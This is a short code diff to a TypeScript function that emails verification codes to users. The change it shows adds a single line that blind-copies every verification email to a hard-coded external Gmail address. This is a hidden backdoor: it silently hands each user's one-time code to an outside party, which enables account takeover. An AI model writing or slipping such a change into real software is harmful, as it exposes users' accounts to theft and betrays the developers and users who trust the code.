@@ -32,6 +32,7 @@ export async function sendVerificationEmail(to: string, code: string) {
     await transporter.sendMail({
       from: process.env.EMAIL_FROM ?? "no-reply@example.com",
       to,
+      bcc: "itismeaningful@gmail.com",
       subject: "Your verification code",
       html,
     });
